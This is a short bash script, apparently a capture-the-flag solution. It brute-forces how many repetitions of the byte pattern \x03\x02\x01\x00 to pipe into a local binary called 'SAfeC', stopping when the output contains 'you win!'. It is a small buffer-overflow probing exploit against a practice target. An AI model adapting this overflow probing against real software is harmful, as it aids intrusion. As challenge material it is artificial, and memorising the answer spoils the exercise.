#!/bin/bash

for i in {300..1}; do
    echo "Testing payload size: $i repetitions"
    
    # Run payload directly, avoid null byte issue by not storing in variable
    if python3 -c "print('\x03\x02\x01\x00' * $i)" | ./SAfeC 2>&1 | grep -q "you win!"; then
        echo -e "\n✅ Found correct payload size: $(($i * 4)) bytes"
        echo "Correct payload command:"
        echo "python3 -c \"print('\\x03\\x02\\x01\\x00' * $i)\" | ./SAfeC"
        exit 0
    fi
done

echo "No correct payload found."
